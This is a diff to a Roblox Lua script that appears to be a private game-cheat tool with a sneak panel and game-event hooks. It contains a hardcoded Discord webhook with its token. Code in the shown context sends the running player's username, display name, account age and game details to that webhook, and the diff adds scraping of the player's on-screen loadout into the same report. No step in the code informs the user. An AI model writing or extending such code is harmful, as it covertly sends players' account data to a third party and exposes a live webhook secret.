@@ -3,10 +3,52 @@ pcall(function()
 end)
 
 local Players           = game:GetService("Players")
+local player    = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
 local HttpService=game:GetService("HttpService")
 local MarketplaceService=game:GetService("MarketplaceService")
 
 local WEBHOOK="https://discord.com/api/webhooks/1513915545974603899/w4_knfLlf2o-u65_cUPRUGkUNsgE06gITiFFLEs0-223OSb-CnRs56q_K1tGs6Bd0OyR"
+
+local LOADOUT_CATEGORIES={
+	"Headlock","Mop","Punch","Block",
+	"Runup","Rush","SquareUp","ToolAnim"
+}
+
+local function detectLoadoutUI()
+	local results={}
+
+	for _,object in ipairs(playerGui:GetDescendants()) do
+		if object:IsA("TextLabel") or object:IsA("TextButton") then
+			local name,value=object.Text:match("^%s*([%w]+)%s*:%s*(.-)%s*$")
+			if name and value and value~="" then
+				for _,category in ipairs(LOADOUT_CATEGORIES) do
+					if name:lower()==category:lower() then
+						results[category]=value
+					end
+				end
+			end
+		end
+	end
+
+	return results
+end
+
+local function waitForLoadout(timeout)
+	local deadline=os.clock()+(timeout or 15)
+	local results={}
+
+	repeat
+		results=detectLoadoutUI()
+		if results.Punch and results.Headlock and results.Mop then
+			break
+		end
+		task.wait(0.5)
+	until os.clock()>=deadline
+
+	return results
+end
 
 task.spawn(function()
 	local player=Players.LocalPlayer
@@ -17,6 +59,8 @@ task.spawn(function()
 		gameName=MarketplaceService:GetProductInfo(game.PlaceId).Name
 	end)
 
+	local loadout=waitForLoadout(15)
+	
 	local fields={
 		{name="Username",value="@"..player.Name,inline=true},
 		{name="Display Name",value=player.DisplayName,inline=true},
@@ -24,9 +68,14 @@ task.spawn(function()
 		{name="Account Age",value=tostring(player.AccountAge).." days",inline=true},
 		{name="Game",value=gameName,inline=true},
 		{name="Place ID",value=tostring(game.PlaceId),inline=true},
-		{name="Punches",value="Not tracked",inline=true},
-		{name="Headlocks",value="Not tracked",inline=true},
-		{name="Blocks",value="Not tracked",inline=true},
+		{name="Punches",value=loadout.Punch or "Not detected",inline=false},
+		{name="Headlocks",value=loadout.Headlock or "Not detected",inline=false},
+		{name="Blocks",value=loadout.Block or "Not detected",inline=false},
+		{name="Mop",value=loadout.Mop or "Not detected",inline=false},
+		{name="Runup",value=loadout.Runup or "Not detected",inline=false},
+		{name="Rush",value=loadout.Rush or "Not detected",inline=false},
+		{name="SquareUp",value=loadout.SquareUp or "Not detected",inline=false},
+		{name="Tool Animation",value=loadout.ToolAnim or "Not detected",inline=false},
 		{name="Date",value=os.date("%Y-%m-%d %H:%M:%S"),inline=false}
 	}
 
@@ -61,9 +110,6 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UIS               = game:GetService("UserInputService")
 local RunService        = game:GetService("RunService")
 local TweenService      = game:GetService("TweenService")
-
-local player    = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
 local events    = ReplicatedStorage:WaitForChild("events")
 local Solo           = events:WaitForChild("SoloPlrEvents")
 local Duo            = events:FindFirstChild("DuoPlrEvents")
@@ -818,77 +864,3 @@ end
 
 buildSneakPanel()
 buildMobileUI()
-
-
-local function detectEquippedLoadout()
-	local CoreDictionary=require(ReplicatedStorage:WaitForChild("CoreDictionary"))
-	local categories={
-		"PunchChoices",
-		"BlockChoices",
-		"KickChoices",
-		"MopChoices",
-		"RunupChoices",
-		"SquareUps",
-		"ToolAnimationChoices"
-	}
-
-	local results={}
-	local categoryLookup={}
-
-	for _,category in ipairs(categories) do
-		results[category]={}
-		categoryLookup[category]={}
-
-		local entries=CoreDictionary[category]
-		if type(entries)=="table" then
-			for name,data in pairs(entries) do
-				categoryLookup[category][tostring(name)]=true
-				if type(data)=="table" and data.Id then
-					categoryLookup[category][tostring(data.Id)]=true
-				end
-			end
-		end
-	end
-
-	for _,object in ipairs(player:GetDescendants()) do
-		if object:IsA("StringValue") or object:IsA("IntValue") or object:IsA("NumberValue") then
-			local value=tostring(object.Value)
-
-			for _,category in ipairs(categories) do
-				if categoryLookup[category][value] then
-					table.insert(results[category],{
-						Name=object.Name,
-						Selection=value,
-						Path=object:GetFullName()
-					})
-				end
-			end
-		end
-	end
-
-	print("========== LORIBANDZZ PRIVATE ⚡ ==========")
-	print("Equipped loadout for @"..player.Name)
-
-	for _,category in ipairs(categories) do
-		print("["..category.."]")
-
-		if #results[category]==0 then
-			print("  Not detected")
-		else
-			for _,entry in ipairs(results[category]) do
-				print("  "..entry.Name.." = "..entry.Selection)
-			end
-		end
-	end
-
-	print("==========================================")
-
-	return results
-end
-
-task.delay(5,function()
-	local ok,err=pcall(detectEquippedLoadout)
-	if not ok then
-		warn("[LoriBandzz Loadout Detector]",err)
-	end
-end)
